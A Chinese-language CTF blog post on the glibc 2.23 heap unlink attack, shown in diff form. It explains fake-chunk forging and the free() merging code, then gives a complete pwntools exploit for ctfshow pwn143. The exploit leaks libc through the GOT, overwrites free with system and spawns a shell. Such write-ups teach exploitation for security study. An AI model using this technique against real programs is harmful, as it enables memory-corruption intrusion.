+<h1 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h1><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ol>
+<li><p>伪造thunk（fake_thunk），</p>
+</li>
+<li><p>修改fake_thunk所在thunk的下一个thunk（这里叫next_thunk）的<code>prev_size</code>、<code>size上的 P flag(通常默认是1)</code>，通过next_thunk的修改来设置fake_thunk的状态是<code>free</code></p>
+<ul>
+<li>prev_size &#x3D; fake_thunk-&gt;size(不包含P，即P&#x3D;0)</li>
+<li>size &#x3D; size-1 (如果size的个位上存在1)</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<p>next_thunk的size有要求，必须&gt;&#x3D; 90，即malloc(0x80)[amd64下]</p>
+<p>不然回收的时候（free(next_thunk)）会将next_thunk收到fastbin中，导致触发不了Unlink</p>
+</blockquote>
+<ol start="3">
+<li>free(next_thunk)：触发Unlink(P)</li>
+</ol>
+<blockquote>
+<p> 解释下<br><code>size上的P flag</code>：PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p>
+<p><code>prev_size</code>：若前一个物理相邻的chunk是free chunk，则表示其大小。否则用于存储前一个chunk的数据</p>
+</blockquote>
+<ol start="4">
+<li>为什么free(next_thunk)会触发Unlink(P)呢？</li>
+</ol>
+<p>首先我要知道在free(next_thunk)下发生了什么</p>
+<pre><code class="hljs">1. next_thunk-&gt; size = 0x91 (默认malloc(0x80)下)，不属于fastbin，归于unsortedbin中
+</code></pre>
+<p>当thunk属于unsortedbin有个特点：如果当前thunk（now_thunk）前的thunk（prev_thunk）属于空闲（now_thunk-&gt;prev_size &#x3D; prev_thunk-&gt;size(该size不包含P位)），则会向后合并，即prev_thunk和now_thunk合并，新的thunk位prev_thunk的地址</p>
+<pre><code class="hljs">2. 调用free的时候发生了什么，我们来看一下源码（glibc-2.23_./malloc/malloc.c）
+</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __libc_free(<span class="hljs-type">void</span> *mem)<br>&#123;<br>    mstate ar_ptr;<br>    mchunkptr p; <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>    <span class="hljs-type">void</span> (*hook)(<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *) = atomic_forced_read(__free_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>        (*hook)(mem, RETURN_ADDRESS(<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>) <span class="hljs-comment">/* free(0) has no effect */</span><br>        <span class="hljs-keyword">return</span>;<br><br>    p = mem2chunk(mem);<br><br>    <span class="hljs-keyword">if</span> (chunk_is_mmapped(p)) <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>        <span class="hljs-comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span><br>        <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>            mp_.mmap_threshold = chunksize(p);<br>            mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                       mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>        munmap_chunk(p);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ar_ptr = arena_for_chunk(p);<br>    _int_free(ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//在_int_free的定义里有这么一段代码,分别记录向后合并和向前合并的过程</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREV_INUSE 0x1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear_inuse_bit_at_offset(p, s)					      \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size &amp;= ~(PREV_INUSE))</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检查P（被free的thunk）是否正在被使用</span><br><span class="hljs-comment">实现合并</span><br><span class="hljs-comment">    获取prev_thunk-&gt;size</span><br><span class="hljs-comment">    两个thunk大小相加</span><br><span class="hljs-comment">    更新P为prev_thunk（P的前一个thunk（物理相邻低地址thunk：prev_thunk））</span><br><span class="hljs-comment">    调用Unlink</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p))<br>&#123;<br>    prevsize = p-&gt;prev_size;<br>    size += prevsize;<br>    p = chunk_at_offset(p, -((<span class="hljs-type">long</span>)prevsize));<br>    unlink(av, p, bck, fwd);<br>&#125;<br><br><span class="hljs-keyword">if</span> (nextchunk != av-&gt;top)<br>&#123;<br>    <span class="hljs-comment">/* get and clear inuse bit */</span><br>    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>    <span class="hljs-comment">/* consolidate forward */</span><br>    <span class="hljs-keyword">if</span> (!nextinuse)<br>    &#123;<br>        unlink(av, nextchunk, bck, fwd);<br>        size += nextsize;<br>    &#125;<span class="hljs-keyword">else</span><br>        clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//.........</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>整理一下思路</p>
+<ul>
+<li>在调用free的时候会先后检查prev_thunk；next_thunk是否在被使用</li>
+<li>如果不被使用 &amp;&amp; next_thunk !&#x3D; top_thunk；那么尝试调用Unlink</li>
+</ul>
+<p>当然这是要满足非fastbin等情况下才会进入上诉两个过程</p>
+</blockquote>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="ctfshowpwn143"><a href="#ctfshowpwn143" class="headerlink" title="ctfshowpwn143"></a>ctfshowpwn143</h2><p>add函数，可以看出它的布局</p>
+<p><img src="/../../../Images/1750083538368-94f978b3-f22a-44da-b808-f044409a05e7.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/../../../Images/1750083781947-ad488819-d15b-4dbb-ad8d-c4cdce393181.png" srcset="/img/loading.gif" lazyload></p>
+<p>edit函数存在堆溢出</p>
+<p><img src="/../../../Images/1750083903679-efef5470-6839-4eb4-aa8b-a8d6b568aa28.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据原理，我们来构造fake_thunk，并触发Unlink</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python">elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    sla(<span class="hljs-string">&#x27;length:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&#x27;the name:&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Edit</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    sla(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>    sla(<span class="hljs-string">&#x27;length of name:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&#x27;the new name:&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Del</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>    sla(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exit</span>():<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))<br><br>chunk_ptr = <span class="hljs-number">0x6020A8</span><br>fakefd = chunk_ptr - <span class="hljs-number">0x18</span><br>fakebk = chunk_ptr - <span class="hljs-number">0x10</span><br><br>fake_thunk = p(<span class="hljs-number">0</span>)<br>fake_thunk += p(<span class="hljs-number">0x41</span>)<br>fake_thunk += p(fakefd)<br>fake_thunk += p(fakebk)<br>fake_thunk += junk(<span class="hljs-number">0x20</span>)<br><br>fake_thunk += p(<span class="hljs-number">0x40</span>)<br>fake_thunk += p(<span class="hljs-number">0x90</span>)<br><br>Add(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>Add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>Add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>Edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(fake_thunk),fake_thunk)<br>Del(<span class="hljs-number">1</span>)<br><br>payload = p(<span class="hljs-number">0</span>) + p(<span class="hljs-number">0</span>) + p(<span class="hljs-number">0x40</span>) + p(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])<br><br>Edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>show()<br>ru(<span class="hljs-string">&#x27; : &#x27;</span>)<br>func_addr = u(r(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lgs(<span class="hljs-built_in">hex</span>(func_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,func_addr)<br><br>libcBase = func_addr - libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br><br>sysAddr,shellStr = SLSysBin(libc,libcBase)<br><br>payload = p(sysAddr)<br>Edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>Del(<span class="hljs-number">2</span>)<br><br>inter()<br></code></pre></td></tr></table></figure>
+
+<h3 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h3><p><img src="/../../../Images/1750134869456-05c2d7b1-e81d-4cd0-9559-f28a57802049.png" srcset="/img/loading.gif" lazyload></p>
+<p>fakefd-&gt;List[1] - 0x18(3*8)</p>
+<p>fakebk-&gt;List[1] - 0x10(2*8)</p>
+<p><code>AMD64下size_t的大小为8、i386下size_t的大小为4</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PWN/" class="category-chain-item">PWN</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/PWN/HEAP/" class="category-chain-item">HEAP</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Unlink</div>
+      <div>https://tforevery.github.io/PWN/HEAP/Unlink/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>TY</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/PWN/HEAP/Unsorted-bin-Attack/" title="Unsorted bin Attack">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Unsorted bin Attack</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/PWN/HEAP/Off-By-One/" title="Off By One">
+                        <span class="hidden-mobile">Off By One</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"4pk0DV0Gzc6TMpnuyhQwgcgs-gzGzoHsz","appKey":"4MnQ5z5ovVgFNdAOxLy5UlVV","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Virtuall</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
